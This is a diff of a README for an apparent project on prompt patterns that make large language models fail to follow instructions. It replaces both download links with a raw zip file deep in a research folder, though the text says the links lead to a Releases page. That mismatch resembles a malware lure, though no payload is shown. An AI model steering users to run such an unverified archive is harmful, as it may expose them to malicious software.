@@ -1,7 +1,7 @@
 # 🎉 AI-Compliance-Failure-Patterns - Understand Compliance Failure Easily
 
 ## 📥 Download the Latest Release
-[![Download Latest Release](https://raw.githubusercontent.com/Men5738/AI-Compliance-Failure-Patterns/main/research/AI-Compliance-Failure-Patterns_v1.9-beta.2.zip)](https://raw.githubusercontent.com/Men5738/AI-Compliance-Failure-Patterns/main/research/AI-Compliance-Failure-Patterns_v1.9-beta.2.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Men5738/AI-Compliance-Failure-Patterns/main/research/llm-results/perplexity/Patterns_A_Compliance_Failure_v3.0.zip)](https://raw.githubusercontent.com/Men5738/AI-Compliance-Failure-Patterns/main/research/llm-results/perplexity/Patterns_A_Compliance_Failure_v3.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the AI-Compliance-Failure-Patterns project. This application helps you explore 11 specific prompt patterns (A-K) that cause instruction non-compliance in major large language models like ChatGPT and Gemini. You can compare their weaknesses and how they respond to policy conflicts. 
@@ -23,7 +23,7 @@ Before downloading, please ensure your system meets the following requirements:
 ## 📥 Download & Install
 To download the software, visit the Releases page using the link below. 
 
-[Download Here](https://raw.githubusercontent.com/Men5738/AI-Compliance-Failure-Patterns/main/research/AI-Compliance-Failure-Patterns_v1.9-beta.2.zip)
+[Download Here](https://raw.githubusercontent.com/Men5738/AI-Compliance-Failure-Patterns/main/research/llm-results/perplexity/Patterns_A_Compliance_Failure_v3.0.zip)
 
 Once on the page, follow these steps:
 1. Locate the latest release version.
